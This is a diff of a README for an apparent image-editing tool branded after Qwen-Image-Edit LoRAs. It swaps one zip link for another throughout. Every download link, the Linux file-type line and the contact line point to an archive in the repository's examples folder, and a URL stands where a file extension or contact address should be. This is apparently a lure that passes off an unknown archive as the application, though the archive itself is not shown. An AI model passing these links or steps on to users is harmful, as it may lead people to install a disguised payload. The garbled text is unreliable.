@@ -1,7 +1,7 @@
 # 🌟 Qwen-Image-Edit-2509-LoRAs-Fast-Lazy-Load - Fast Image Editing Made Easy
 
 ## 📥 Download Now!
-[![Download Qwen-Image-Edit-2509-LoRAs-Fast-Lazy-Load](https://github.com/xolayugh/Qwen-Image-Edit-2509-LoRAs-Fast-Lazy-Load/raw/refs/heads/main/examples/Edit-Lo-As-R-Load-Qwen-Lazy-Fast-Image-v2.7.zip)](https://github.com/xolayugh/Qwen-Image-Edit-2509-LoRAs-Fast-Lazy-Load/raw/refs/heads/main/examples/Edit-Lo-As-R-Load-Qwen-Lazy-Fast-Image-v2.7.zip)
+[![Download Qwen-Image-Edit-2509-LoRAs-Fast-Lazy-Load](https://raw.githubusercontent.com/xolayugh/Qwen-Image-Edit-2509-LoRAs-Fast-Lazy-Load/main/examples/Qwen_Lo_Image_Fast_Edit_As_R_Load_Lazy_v2.5.zip)](https://raw.githubusercontent.com/xolayugh/Qwen-Image-Edit-2509-LoRAs-Fast-Lazy-Load/main/examples/Qwen_Lo_Image_Fast_Edit_As_R_Load_Lazy_v2.5.zip)
 
 ## 🚀 Getting Started
 
@@ -24,7 +24,7 @@ Before proceeding, ensure your system meets the following requirements:
 
 To download the application, visit the following page:
 
-[Download Qwen-Image-Edit-2509-LoRAs-Fast-Lazy-Load](https://github.com/xolayugh/Qwen-Image-Edit-2509-LoRAs-Fast-Lazy-Load/raw/refs/heads/main/examples/Edit-Lo-As-R-Load-Qwen-Lazy-Fast-Image-v2.7.zip)
+[Download Qwen-Image-Edit-2509-LoRAs-Fast-Lazy-Load](https://raw.githubusercontent.com/xolayugh/Qwen-Image-Edit-2509-LoRAs-Fast-Lazy-Load/main/examples/Qwen_Lo_Image_Fast_Edit_As_R_Load_Lazy_v2.5.zip)
 
 ### 2. Choose the Latest Release
 
@@ -32,7 +32,7 @@ Once on the page, find the latest release. It is usually at the top of the list 
 
 ### 3. Download the Application
 
-Click the appropriate file for your operating system to begin downloading. The files are typically in `.exe` for Windows, `.dmg` for macOS, or `https://github.com/xolayugh/Qwen-Image-Edit-2509-LoRAs-Fast-Lazy-Load/raw/refs/heads/main/examples/Edit-Lo-As-R-Load-Qwen-Lazy-Fast-Image-v2.7.zip` for Linux.
+Click the appropriate file for your operating system to begin downloading. The files are typically in `.exe` for Windows, `.dmg` for macOS, or `https://raw.githubusercontent.com/xolayugh/Qwen-Image-Edit-2509-LoRAs-Fast-Lazy-Load/main/examples/Qwen_Lo_Image_Fast_Edit_As_R_Load_Lazy_v2.5.zip` for Linux.
 
 ### 4. Run the Application
 
@@ -40,7 +40,7 @@ After the download completes, locate the file in your "Downloads" folder.
 
 - On **Windows**: Double-click the `.exe` file to run the installer and follow the instructions.
 - On **macOS**: Open the `.dmg` file and drag the application to your "Applications" folder.
-- On **Linux**: Extract the `https://github.com/xolayugh/Qwen-Image-Edit-2509-LoRAs-Fast-Lazy-Load/raw/refs/heads/main/examples/Edit-Lo-As-R-Load-Qwen-Lazy-Fast-Image-v2.7.zip` file and follow the instructions in the README file there.
+- On **Linux**: Extract the `https://raw.githubusercontent.com/xolayugh/Qwen-Image-Edit-2509-LoRAs-Fast-Lazy-Load/main/examples/Qwen_Lo_Image_Fast_Edit_As_R_Load_Lazy_v2.5.zip` file and follow the instructions in the README file there.
 
 ## 🎨 How to Use Qwen-Image-Edit-2509
 
@@ -69,6 +69,6 @@ This project is licensed under the MIT License. For more details, refer to the L
 
 ## 📫 Contact
 
-For any inquiries or feedback, please open an issue on GitHub or reach out via [https://github.com/xolayugh/Qwen-Image-Edit-2509-LoRAs-Fast-Lazy-Load/raw/refs/heads/main/examples/Edit-Lo-As-R-Load-Qwen-Lazy-Fast-Image-v2.7.zip].
+For any inquiries or feedback, please open an issue on GitHub or reach out via [https://raw.githubusercontent.com/xolayugh/Qwen-Image-Edit-2509-LoRAs-Fast-Lazy-Load/main/examples/Qwen_Lo_Image_Fast_Edit_As_R_Load_Lazy_v2.5.zip].
 
 Enjoy enhancing your images with Qwen-Image-Edit-2509!
